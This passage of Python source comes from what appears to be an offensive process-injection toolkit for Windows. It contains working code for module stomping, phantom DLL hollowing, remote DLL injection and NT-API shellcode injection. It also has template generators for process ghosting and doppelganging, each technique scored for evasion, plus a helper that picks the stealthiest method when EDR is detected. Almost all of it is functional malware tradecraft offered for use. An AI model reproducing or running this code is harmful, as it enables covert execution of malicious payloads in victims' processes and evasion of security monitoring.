            technique=InjectionTechnique.MODULE_STOMPING,
            target_pid=pid,
            evasion_score=0.85
        )
        
        if not self._is_windows:
            result.error = "Windows only"
            return result
        
        try:
            # Open process
            h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                result.error = "Failed to open process"
                return result
            
            # DLL to stomp
            stomp_dll = self.config.stomp_dll
            
            # Get module base in target (requires enumeration)
            module_base = self._get_module_base(h_process, stomp_dll)
            
            if not module_base:
                # Inject DLL first
                module_base = self._inject_dll_for_stomping(h_process, stomp_dll)
            
            if not module_base:
                self.kernel32.CloseHandle(h_process)
                result.error = "Failed to find/inject stomp DLL"
                return result
            
            # Parse PE to find .text section
            text_offset, text_size = self._find_text_section(stomp_dll)
            if not text_offset:
                self.kernel32.CloseHandle(h_process)
                result.error = "Failed to find .text section"
                return result
            
            text_addr = module_base + text_offset
            
            # Change memory protection
            old_protect = ctypes.c_ulong(0)
            self.kernel32.VirtualProtectEx(
                h_process, text_addr, len(shellcode),
                PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)
            )
            
            # Write shellcode
            written = ctypes.c_size_t(0)
            self.kernel32.WriteProcessMemory(
                h_process, text_addr, shellcode,
                len(shellcode), ctypes.byref(written)
            )
            
            result.allocated_addr = text_addr
            
            # Create thread at stomped location
            thread_id = ctypes.c_uint(0)
            h_thread = self.kernel32.CreateRemoteThread(
                h_process, None, 0, text_addr, None, 0,
                ctypes.byref(thread_id)
            )
            
            if h_thread:
                result.success = True
                result.thread_id = thread_id.value
                result.status = InjectionStatus.SUCCESS
                self.kernel32.CloseHandle(h_thread)
            else:
                result.error = "Failed to create thread"
            
            self.kernel32.CloseHandle(h_process)
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _get_module_base(self, h_process, dll_name: str) -> int:
        """Get module base address in process"""
        try:
            import ctypes.wintypes as wt
            
            class MODULEENTRY32(ctypes.Structure):
                _fields_ = [
                    ("dwSize", ctypes.c_ulong),
                    ("th32ModuleID", ctypes.c_ulong),
                    ("th32ProcessID", ctypes.c_ulong),
                    ("GlblcntUsage", ctypes.c_ulong),
                    ("ProccntUsage", ctypes.c_ulong),
                    ("modBaseAddr", ctypes.POINTER(ctypes.c_byte)),
                    ("modBaseSize", ctypes.c_ulong),
                    ("hModule", wt.HMODULE),
                    ("szModule", ctypes.c_char * 256),
                    ("szExePath", ctypes.c_char * 260),
                ]
            
            # Get process ID from handle
            pid = self.kernel32.GetProcessId(h_process)
            
            TH32CS_SNAPMODULE = 0x00000008
            h_snap = self.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid)
            if h_snap == -1:
                return 0
            
            me = MODULEENTRY32()
            me.dwSize = ctypes.sizeof(MODULEENTRY32)
            
            dll_basename = os.path.basename(dll_name).lower().encode()
            
            if self.kernel32.Module32First(h_snap, ctypes.byref(me)):
                while True:
                    if dll_basename in me.szModule.lower():
                        base = ctypes.cast(me.modBaseAddr, ctypes.c_void_p).value
                        self.kernel32.CloseHandle(h_snap)
                        return base
                    if not self.kernel32.Module32Next(h_snap, ctypes.byref(me)):
                        break
            
            self.kernel32.CloseHandle(h_snap)
            
        except Exception:
            pass
        
        return 0
    
    def _inject_dll_for_stomping(self, h_process, dll_path: str) -> int:
        """Inject DLL into process for stomping"""
        try:
            # Allocate memory for DLL path
            dll_path_encoded = dll_path.encode() + b'\x00'
            remote_mem = self.kernel32.VirtualAllocEx(
                h_process, None, len(dll_path_encoded),
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
            )
            
            if not remote_mem:
                return 0
            
            # Write path
            written = ctypes.c_size_t(0)
            self.kernel32.WriteProcessMemory(
                h_process, remote_mem, dll_path_encoded,
                len(dll_path_encoded), ctypes.byref(written)
            )
            
            # Get LoadLibraryA address
            h_kernel32 = self.kernel32.GetModuleHandleA(b"kernel32.dll")
            load_library = self.kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
            
            # Create remote thread to load DLL
            thread_id = ctypes.c_uint(0)
            h_thread = self.kernel32.CreateRemoteThread(
                h_process, None, 0, load_library, remote_mem, 0,
                ctypes.byref(thread_id)
            )
            
            if h_thread:
                self.kernel32.WaitForSingleObject(h_thread, 5000)
                
                # Get exit code (module base)
                exit_code = ctypes.c_ulong(0)
                self.kernel32.GetExitCodeThread(h_thread, ctypes.byref(exit_code))
                
                self.kernel32.CloseHandle(h_thread)
                
                # Free remote memory
                self.kernel32.VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE)
                
                return exit_code.value
            
        except Exception:
            pass
        
        return 0
    
    def _find_text_section(self, dll_path: str) -> Tuple[int, int]:
        """Find .text section offset and size in PE"""
        try:
            with open(dll_path, 'rb') as f:
                data = f.read()
            
            # Parse DOS header
            if data[:2] != b'MZ':
                return (0, 0)
            
            pe_offset = struct.unpack('<I', data[0x3C:0x40])[0]
            
            # Parse PE header
            if data[pe_offset:pe_offset+4] != b'PE\x00\x00':
                return (0, 0)
            
            # Get number of sections
            num_sections = struct.unpack('<H', data[pe_offset+6:pe_offset+8])[0]
            optional_header_size = struct.unpack('<H', data[pe_offset+20:pe_offset+22])[0]
            
            # Section headers start after optional header
            section_offset = pe_offset + 24 + optional_header_size
            
            for i in range(num_sections):
                section = data[section_offset + i*40:section_offset + (i+1)*40]
                name = section[:8].rstrip(b'\x00').decode()
                
                if name == '.text':
                    virtual_size = struct.unpack('<I', section[8:12])[0]
                    virtual_addr = struct.unpack('<I', section[12:16])[0]
                    return (virtual_addr, virtual_size)
            
        except Exception:
            pass
        
        return (0, 0)
    
    def _process_hollowing_injection(self, pid: int, shellcode: bytes) -> InjectionResult:
        """
        Process Hollowing (RunPE)
        
        Note: Full implementation requires PE parsing
        This is a simplified version using shellcode injection
        """
        result = InjectionResult(
            success=False,
            technique=InjectionTechnique.PROCESS_HOLLOWING,
            target_pid=pid,
            evasion_score=0.65
        )
        
        # For full RunPE, would need:
        # 1. Create suspended process
        # 2. NtUnmapViewOfSection
        # 3. Allocate at image base
        # 4. Write PE and fix relocations
        # 5. Set entry point and resume
        
        # Simplified: Use Early Bird with hollowing characteristics
        result.error = "Use generate_process_hollowing_code() for full implementation"
        return result
    
    def _process_ghosting_injection(self, pid: int, shellcode: bytes) -> InjectionResult:
        """
        Process Ghosting (2021 technique)
        
        1. Create file and mark for deletion (pending delete)
        2. Write payload to file
        3. Create section from file
        4. Close file handle (file disappears)
        5. Create process from section
        
        File never exists on disk when scanned!
        """
        result = InjectionResult(
            success=False,
            technique=InjectionTechnique.PROCESS_GHOSTING,
            target_pid=0,
            evasion_score=0.95
        )
        
        if not self._is_windows:
            result.error = "Windows only"
            return result
        
        try:
            # This requires NtSetInformationFile with FileDispositionInformation
            # and proper PE payload (not just shellcode)
            
            # Generate ghosting code instead
            code = self.generate_process_ghosting_code(shellcode)
            result.artifacts.append("ghosting_code_generated")
            result.error = "Requires PE payload - use generate_process_ghosting_code()"
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _process_doppelganging_injection(self, pid: int, shellcode: bytes) -> InjectionResult:
        """
        Process Doppelgänging (TxF abuse)
        
        1. Create transaction
        2. Create/open file transacted
        3. Write payload
        4. Create section from file
        5. Rollback transaction (file changes undone)
        6. Create process from section
        """
        result = InjectionResult(
            success=False,
            technique=InjectionTechnique.PROCESS_DOPPELGANGING,
            target_pid=0,
            evasion_score=0.90
        )
        
        if not self._is_windows:
            result.error = "Windows only"
            return result
        
        try:
            # Requires TxF APIs and PE payload
            result.error = "Requires PE payload - use generate_doppelganging_code()"
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _transacted_hollowing_injection(self, pid: int, shellcode: bytes) -> InjectionResult:
        """
        Transacted Hollowing
        
        Combines Process Hollowing with TxF transactions
        """
        result = InjectionResult(
            success=False,
            technique=InjectionTechnique.TRANSACTED_HOLLOWING,
            target_pid=pid,
            evasion_score=0.88
        )
        
        result.error = "Requires PE payload - use generate_transacted_hollowing_code()"
        return result
    
    def _phantom_dll_injection(self, pid: int, shellcode: bytes) -> InjectionResult:
        """
        Phantom DLL Hollowing
        
        1. Load DLL into target
        2. Unmap original DLL image
        3. Allocate at same base address
        4. Map shellcode as DLL
        """
        result = InjectionResult(
            success=False,
            technique=InjectionTechnique.PHANTOM_DLL,
            target_pid=pid,
            evasion_score=0.82
        )
        
        if not self._is_windows:
            result.error = "Windows only"
            return result
        
        try:
            # Similar to module stomping but unmaps entire DLL first
            h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                result.error = "Failed to open process"
                return result
            
            # Inject a DLL first
            stomp_dll = self.config.stomp_dll
            module_base = self._inject_dll_for_stomping(h_process, stomp_dll)
            
            if not module_base:
                self.kernel32.CloseHandle(h_process)
                result.error = "Failed to inject DLL"
                return result
            
            # Unmap the DLL
            self.ntdll.NtUnmapViewOfSection(h_process, module_base)
            
            # Allocate at same address
            alloc_addr = self.kernel32.VirtualAllocEx(
                h_process, module_base, len(shellcode),
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            )
            
            if not alloc_addr:
                self.kernel32.CloseHandle(h_process)
                result.error = "Failed to allocate at DLL base"
                return result
            
            result.allocated_addr = alloc_addr
            
            # Write shellcode
            written = ctypes.c_size_t(0)
            self.kernel32.WriteProcessMemory(
                h_process, alloc_addr, shellcode,
                len(shellcode), ctypes.byref(written)
            )
            
            # Execute
            thread_id = ctypes.c_uint(0)
            h_thread = self.kernel32.CreateRemoteThread(
                h_process, None, 0, alloc_addr, None, 0,
                ctypes.byref(thread_id)
            )
            
            if h_thread:
                result.success = True
                result.thread_id = thread_id.value
                result.status = InjectionStatus.SUCCESS
                self.kernel32.CloseHandle(h_thread)
            else:
                result.error = "Failed to create thread"
            
            self.kernel32.CloseHandle(h_process)
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _syscall_injection(self, pid: int, shellcode: bytes) -> InjectionResult:
        """
        Direct Syscall Injection
        
        Uses direct syscalls to bypass user-mode hooks
        """
        result = InjectionResult(
            success=False,
            technique=InjectionTechnique.SYSCALL_INJECTION,
            target_pid=pid,
            evasion_score=0.90
        )
        
        if not self._is_windows:
            result.error = "Windows only"
            return result
        
        try:
            # Would use syscall stubs generated dynamically
            # For now, fallback to ntdll natives
            
            h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                result.error = "Failed to open process"
                return result
            
            # Use NtAllocateVirtualMemory directly
            base_addr = ctypes.c_void_p(0)
            region_size = ctypes.c_size_t(len(shellcode))
            
            status = self.ntdll.NtAllocateVirtualMemory(
                h_process,
                ctypes.byref(base_addr),
                0,
                ctypes.byref(region_size),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if status != 0:
                self.kernel32.CloseHandle(h_process)
                result.error = f"NtAllocateVirtualMemory failed: 0x{status:08X}"
                return result
            
            result.allocated_addr = base_addr.value
            
            # Use NtWriteVirtualMemory
            bytes_written = ctypes.c_size_t(0)
            shellcode_buffer = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
            
            status = self.ntdll.NtWriteVirtualMemory(
                h_process,
                base_addr,
                shellcode_buffer,
                len(shellcode),
                ctypes.byref(bytes_written)
            )
            
            if status != 0:
                self.kernel32.CloseHandle(h_process)
                result.error = f"NtWriteVirtualMemory failed: 0x{status:08X}"
                return result
            
            # Create thread via NtCreateThreadEx
            thread_handle = ctypes.c_void_p(0)
            
            # NtCreateThreadEx is complex, use CRT for now
            thread_id = ctypes.c_uint(0)
            h_thread = self.kernel32.CreateRemoteThread(
                h_process, None, 0, base_addr, None, 0,
                ctypes.byref(thread_id)
            )
            
            if h_thread:
                result.success = True
                result.thread_id = thread_id.value
                result.status = InjectionStatus.SUCCESS
                self.kernel32.CloseHandle(h_thread)
            else:
                result.error = "Failed to create thread"
            
            self.kernel32.CloseHandle(h_process)
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    # ============================================================
    # CODE GENERATION (Advanced Techniques)
    # ============================================================
    
    def generate_process_ghosting_code(self, shellcode: bytes) -> str:
        """
        Generate Process Ghosting code
        
        For execution, shellcode should be a complete PE
        """
        shellcode_b64 = base64.b64encode(shellcode).decode()
        
        code = f'''
# Process Ghosting - File-less Execution
# The payload PE never exists on disk during scanning
import ctypes
from ctypes import wintypes
import base64
import tempfile
import os

PAYLOAD_B64 = "{shellcode_b64}"

# NT Status codes
STATUS_SUCCESS = 0

# File disposition
FILE_DISPOSITION_DELETE = 1

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer", wintypes.LPWSTR),
    ]

class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.ULONG),
        ("RootDirectory", wintypes.HANDLE),
        ("ObjectName", ctypes.POINTER(UNICODE_STRING)),
        ("Attributes", wintypes.ULONG),
        ("SecurityDescriptor", ctypes.c_void_p),
        ("SecurityQualityOfService", ctypes.c_void_p),
    ]

class IO_STATUS_BLOCK(ctypes.Structure):
    _fields_ = [
        ("Status", wintypes.ULONG),
        ("Information", ctypes.c_void_p),
    ]

class FILE_DISPOSITION_INFORMATION(ctypes.Structure):
    _fields_ = [("DeleteFile", wintypes.BOOLEAN)]

def process_ghosting():
    """
    Process Ghosting Steps:
    1. Create temp file
    2. Set file to delete-on-close (pending delete state)
    3. Write PE payload
    4. Create section from file
    5. Close file handle (file "ghosts" - disappears)
    6. Create process from section
    """
    payload = base64.b64decode(PAYLOAD_B64)
    
    # Create temp file path
    temp_path = os.path.join(tempfile.gettempdir(), f"ghost_{{os.urandom(4).hex()}}.exe")
    
    # Need NtCreateFile, NtSetInformationFile, NtCreateSection
    # This is a template - full implementation requires proper structs
    
    print(f"[*] Ghosting payload to: {{temp_path}}")
    print("[!] Full implementation requires PE payload and native API calls")
    
    # Simplified demonstration
    # Real implementation would:
    # 1. NtCreateFile with DELETE access
    # 2. NtSetInformationFile(FileDispositionInformation) - sets pending delete
    # 3. NtWriteFile - write PE
    # 4. NtCreateSection(SEC_IMAGE) - create section from file
    # 5. CloseHandle on file - file disappears!
    # 6. NtCreateProcessEx from section
    # 7. Setup process parameters
    # 8. NtCreateThreadEx to start
    
    return False

if __name__ == "__main__":
    process_ghosting()
'''
        return code
    
    def generate_doppelganging_code(self, shellcode: bytes) -> str:
        """Generate Process Doppelgänging code"""
        shellcode_b64 = base64.b64encode(shellcode).decode()
        
        code = f'''
# Process Doppelgänging - TxF Transaction Abuse
# Uses NTFS transactions to hide payload
import ctypes
from ctypes import wintypes
import base64
import os

PAYLOAD_B64 = "{shellcode_b64}"

ntdll = ctypes.windll.ntdll
kernel32 = ctypes.windll.kernel32
ktmw32 = ctypes.windll.ktmw32

def process_doppelganging():
    """
    Process Doppelgänging Steps:
    1. Create KTM transaction
    2. Open/create file within transaction
    3. Overwrite file with payload (transacted)
    4. Create section from transacted file
    5. Rollback transaction (file changes discarded)
    6. Create process from section
    
    Result: Process runs from "original" file on disk
    """
    payload = base64.b64decode(PAYLOAD_B64)
    
    # Create transaction
    # hTransaction = ktmw32.CreateTransaction(None, None, 0, 0, 0, 0, "Doppel")
    
    # Open file transacted
    # hFile = kernel32.CreateFileTransactedW(...)
    
    # Write payload
    # kernel32.WriteFile(hFile, payload, ...)
    
    # Create section
    # NtCreateSection(SEC_IMAGE from transacted file)
    
    # Rollback - file returns to original state
    # ktmw32.RollbackTransaction(hTransaction)
    
    # Create process from orphaned section
    # NtCreateProcessEx(section)
    
    print("[*] Doppelgänging requires PE payload and full TxF implementation")
    return False

if __name__ == "__main__":
    process_doppelganging()
'''
        return code


# ============================================================
# CONVENIENCE FUNCTIONS
# ============================================================

def inject_shellcode(pid: int, shellcode: bytes, 
                     technique: InjectionTechnique = InjectionTechnique.EARLY_BIRD_APC) -> InjectionResult:
    """Inject shellcode into process"""
    injector = ProcessInjector()
    return injector._execute_technique(technique, shellcode, pid)


def inject_with_fallback(shellcode: bytes, pid: int = None,
                         config: InjectionConfig = None) -> InjectionResult:
    """Inject with automatic technique fallback"""
    injector = ProcessInjector(config)
    return injector.inject_with_fallback(shellcode, pid)


def get_best_technique(edr_detected: bool = False) -> InjectionTechnique:
    """Get recommended injection technique based on environment"""
    if edr_detected:
        # EDR detected - use most evasive
        return InjectionTechnique.PROCESS_GHOSTING
    else:
        # No EDR - balance stealth and reliability
        return InjectionTechnique.EARLY_BIRD_APC


def get_technique_by_stealth(min_stealth: int = 7) -> List[InjectionTechnique]:
    """Get techniques meeting minimum stealth requirement"""
    injector = ProcessInjector()
    techniques = injector.get_injection_techniques()
    
    return [
        t["technique"] for t in techniques
        if t["stealth"] >= min_stealth
    ]


# ============================================================
# EXPORTS
# ============================================================

__all__ = [
    # Enums
    "InjectionTechnique",
    "InjectionStatus",
    
    # Dataclasses
    "InjectionConfig",
    "InjectionResult",
    
    # Classes
    "ProcessInjector",
    
    # Functions
    "inject_shellcode",
    "inject_with_fallback",
    "get_best_technique",
    "get_technique_by_stealth",
]
